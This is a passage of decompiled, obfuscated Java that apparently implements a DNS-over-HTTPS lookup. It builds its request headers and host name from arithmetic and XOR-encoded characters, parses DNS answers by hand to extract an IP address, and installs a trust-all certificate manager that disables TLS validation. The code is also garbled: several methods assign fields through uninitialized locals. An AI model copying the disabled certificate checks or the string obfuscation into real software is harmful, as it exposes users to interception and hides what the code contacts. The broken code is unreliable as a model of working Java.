            stringBuilder4.append((char)(26022 - 25914));
            stringBuilder4.append((char)(47507 - 47410));
            stringBuilder3.append(stringBuilder4.toString());
            StringBuilder stringBuilder5 = new StringBuilder();
            stringBuilder5.append((char)(53133 - 53019));
            stringBuilder5.append((char)(18337 - 18236));
            stringBuilder5.append((char)(1884 - 1839));
            stringBuilder5.append((char)(22100 - 22000));
            stringBuilder5.append((char)(10632 - 10522));
            stringBuilder5.append((char)(41772 - 41657));
            stringBuilder5.append((char)(4237 - 4191));
            stringBuilder5.append((char)(52222 - 52123));
            stringBuilder5.append((char)(46620 - 46509));
            stringBuilder5.append((char)(53128 - 53019));
            stringBuilder5.append((char)(18249 - 18236));
            stringBuilder5.append((char)(1849 - 1839));
            stringBuilder3.append(stringBuilder5.toString());
            xuwqvk_znyacb_fqaajs.append(stringBuilder3.toString());
            StringBuilder stringBuilder6 = new StringBuilder();
            StringBuilder stringBuilder7 = new StringBuilder();
            stringBuilder7.append((char)(26293 - 26228));
            stringBuilder7.append((char)(50203 - 50104));
            stringBuilder7.append((char)(7071 - 6972));
            stringBuilder7.append((char)(57784 - 57683));
            stringBuilder7.append((char)(16753 - 16641));
            stringBuilder7.append((char)(3196 - 3080));
            stringBuilder7.append((char)(26157 - 26099));
            stringBuilder7.append((char)(26260 - 26228));
            stringBuilder7.append((char)(50201 - 50104));
            stringBuilder7.append((char)(7084 - 6972));
            stringBuilder7.append((char)(57795 - 57683));
            stringBuilder6.append(stringBuilder7.toString());
            StringBuilder stringBuilder8 = new StringBuilder();
            stringBuilder8.append((char)(62452 + 3192));
            stringBuilder8.append((char)(44027 + 21614));
            stringBuilder8.append((char)(13311 + 52324));
            stringBuilder8.append((char)(19055 + 46578));
            stringBuilder8.append((char)(21486 + 44166));
            stringBuilder8.append((char)(62449 + 3192));
            stringBuilder8.append((char)(44033 + 21614));
            stringBuilder8.append((char)(13322 + 52324));
            stringBuilder8.append((char)(19005 + 46578));
            stringBuilder6.append(stringBuilder8.toString());
            StringBuilder stringBuilder9 = new StringBuilder();
            stringBuilder9.append((char)(0xAA20 ^ 0xAA44));
            stringBuilder9.append((char)(0x5EE3 ^ 0x5E8D));
            stringBuilder9.append((char)(0xAA05 ^ 0xAA76));
            stringBuilder9.append((char)(0x47EA ^ 0x47C7));
            stringBuilder9.append((char)(0xD757 ^ 0xD73A));
            stringBuilder9.append((char)(0x670E ^ 0x676B));
            stringBuilder9.append((char)(0xAA37 ^ 0xAA44));
            stringBuilder9.append((char)(0x5EFE ^ 0x5E8D));
            stringBuilder9.append((char)(0xAA17 ^ 0xAA76));
            stringBuilder9.append((char)(0x47A0 ^ 0x47C7));
            stringBuilder9.append((char)(0xD75F ^ 0xD73A));
            stringBuilder9.append((char)(0x6766 ^ 0x676B));
            stringBuilder9.append((char)(0xAA4E ^ 0xAA44));
            stringBuilder6.append(stringBuilder9.toString());
            xuwqvk_znyacb_fqaajs.append(stringBuilder6.toString());
            StringBuilder stringBuilder10 = new StringBuilder();
            stringBuilder10.append((char)(0x7430 ^ 0x7473));
            stringBuilder10.append((char)(0xBCE5 ^ 0xBC8A));
            stringBuilder10.append((char)(0x15CE ^ 0x15A0));
            stringBuilder10.append((char)(0x5997 ^ 0x59F9));
            stringBuilder10.append((char)(0x6B94 ^ 0x6BF1));
            stringBuilder10.append((char)(0x2F2D ^ 0x2F4E));
            stringBuilder10.append((char)(0xECF7 ^ 0xEC83));
            stringBuilder10.append((char)(0x29C7 ^ 0x29AE));
            stringBuilder10.append((char)(0x1988 ^ 0x19E7));
            stringBuilder10.append((char)(0x7217 ^ 0x7279));
            stringBuilder10.append((char)(0x7449 ^ 0x7473));
            stringBuilder10.append((char)(0xBCAA ^ 0xBC8A));
            stringBuilder10.append((char)(0x15C3 ^ 0x15A0));
            stringBuilder10.append((char)(0x5995 ^ 0x59F9));
            stringBuilder10.append((char)(0x6B9E ^ 0x6BF1));
            stringBuilder10.append((char)(0x2F3D ^ 0x2F4E));
            stringBuilder10.append((char)(0xECE6 ^ 0xEC83));
            stringBuilder10.append((char)(0x29A3 ^ 0x29AE));
            stringBuilder10.append((char)(0x19ED ^ 0x19E7));
            xuwqvk_znyacb_fqaajs.append(stringBuilder10.toString());
            xuwqvk_znyacb_fqaajs.append("\r\n");
            cimGvmbNdozfVem.write(xuwqvk_znyacb_fqaajs.toString().getBytes(StandardCharsets.ISO_8859_1));
            cimGvmbNdozfVem.flush();
            lasaPiglZwzhFhsvb fs3fs7ae = PAYym8FkkE.ptrTgdufkh(optsLen);
            byte[] byArray = fs3fs7ae.body;
            return byArray;
        }
        finally {
            kStr.close();
        }
    }

    private static String xfykOypUwdPb(byte[] iStr) {
        if (iStr == null || iStr.length < 12) {
            return null;
        }
        ByteBuffer dvkqqeCinab = ByteBuffer.wrap(iStr);
        dvkqqeCinab.getShort();
        short wmcw_eevd_nuvn_yx = dvkqqeCinab.getShort();
        if ((wmcw_eevd_nuvn_yx & 0x8000) == 0) {
            return null;
        }
        int qefbcl_fh_jq = wmcw_eevd_nuvn_yx & 0xF;
        if (qefbcl_fh_jq != 0) {
            return null;
        }
        int zqd_sd_vr_zub = dvkqqeCinab.getShort() & 0xFFFF;
        int skikov_cuzq_va = dvkqqeCinab.getShort() & 0xFFFF;
        dvkqqeCinab.getShort();
        dvkqqeCinab.getShort();
        for (int yfjxu_iet = 0; yfjxu_iet < zqd_sd_vr_zub; ++yfjxu_iet) {
            PAYym8FkkE.ofoDv(dvkqqeCinab);
            dvkqqeCinab.getShort();
            dvkqqeCinab.getShort();
        }
        for (int key2 = 0; key2 < skikov_cuzq_va; ++key2) {
            PAYym8FkkE.ofoDv(dvkqqeCinab);
            int njbNsaHkm = dvkqqeCinab.getShort() & 0xFFFF;
            dvkqqeCinab.getShort();
            dvkqqeCinab.getInt();
            int gxRM_cmQC_wLfo_ZnPG = dvkqqeCinab.getShort() & 0xFFFF;
            if (njbNsaHkm == 1 && gxRM_cmQC_wLfo_ZnPG == 4) {
                byte[] kxjmr_bc_guqfuz_qxi = new byte[4];
                dvkqqeCinab.get(kxjmr_bc_guqfuz_qxi);
                int n = kxjmr_bc_guqfuz_qxi[3] & 0xFF;
                int n2 = kxjmr_bc_guqfuz_qxi[2] & 0xFF;
                int n3 = kxjmr_bc_guqfuz_qxi[1] & 0xFF;
                int n4 = kxjmr_bc_guqfuz_qxi[0] & 0xFF;
                return n4 + "." + n3 + "." + n2 + "." + n;
            }
            dvkqqeCinab.position(dvkqqeCinab.position() + gxRM_cmQC_wLfo_ZnPG);
        }
        return null;
    }

    private static void ofoDv(ByteBuffer configRaw) {
        int xnuzoh_ly_gcer_xhruyq;
        while (configRaw.hasRemaining() && (xnuzoh_ly_gcer_xhruyq = configRaw.get() & 0xFF) != 0) {
            if ((xnuzoh_ly_gcer_xhruyq & 0xC0) == 192) {
                configRaw.get();
                break;
            }
            configRaw.position(configRaw.position() + xnuzoh_ly_gcer_xhruyq);
        }
    }

    static {
        try {
            SSLContext xZzd_Yrdk_eOeR_etRy = SSLContext.getInstance("TLS");
            xZzd_Yrdk_eOeR_etRy.init(null, new TrustManager[]{new dqxtoluSivhebjNorjLbdld()}, new SecureRandom());
            si_pr = xZzd_Yrdk_eOeR_etRy.getSocketFactory();
        }
        catch (Exception sxZeb) {
            si_pr = (SSLSocketFactory)SSLSocketFactory.getDefault();
        }
    }

    public static class lasaPiglZwzhFhsvb {
        public final int statusCode;
        public final String statusLine;
        public final Map<String, String> headers;
        public final byte[] body;

        lasaPiglZwzhFhsvb(int eCJnt, String ecmj_om_qr_rzeyi, Map<String, String> _Cm_lLCOr_K1yT, byte[] tempRaw) {
            lasaPiglZwzhFhsvb uFLQ_Qqgt_lrXX_MffW;
            uFLQ_Qqgt_lrXX_MffW.statusCode = eCJnt;
            uFLQ_Qqgt_lrXX_MffW.statusLine = ecmj_om_qr_rzeyi;
            uFLQ_Qqgt_lrXX_MffW.headers = _Cm_lLCOr_K1yT;
            uFLQ_Qqgt_lrXX_MffW.body = tempRaw;
        }

        public String bodyString() {
            lasaPiglZwzhFhsvb f2zfE;
            return new String(f2zfE.body, StandardCharsets.UTF_8);
        }

        public String header(String BYey_gHiA_mWyi_yuEY) {
            lasaPiglZwzhFhsvb kqD5LrZZ_H_;
            return kqD5LrZZ_H_.headers.get(BYey_gHiA_mWyi_yuEY.toLowerCase());
        }
    }

    private static class iUmkhj {
        final String ip;
        final long expiresAt;

        iUmkhj(String stateVal, long cfJa) {
            iUmkhj rlvmqEuq;
            rlvmqEuq.ip = stateVal;
            rlvmqEuq.expiresAt = cfJa;
        }

        boolean isExpired() {
            iUmkhj jf_jcelss;
            return System.currentTimeMillis() > jf_jcelss.expiresAt;
        }
    }

    private static class dqxtoluSivhebjNorjLbdld
    implements X509TrustManager {
        private dqxtoluSivhebjNorjLbdld() {
            dqxtoluSivhebjNorjLbdld MBhM_tyrK_BtTS_dbrR;
        }

        @Override
        public void checkClientTrusted(X509Certificate[] so_ubtm, String umTkVpXs) {
        }

        @Override
        public void checkServerTrusted(X509Certificate[] voyvtr_xcdy, String bnaEdu) {
        }

        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }
    }
}

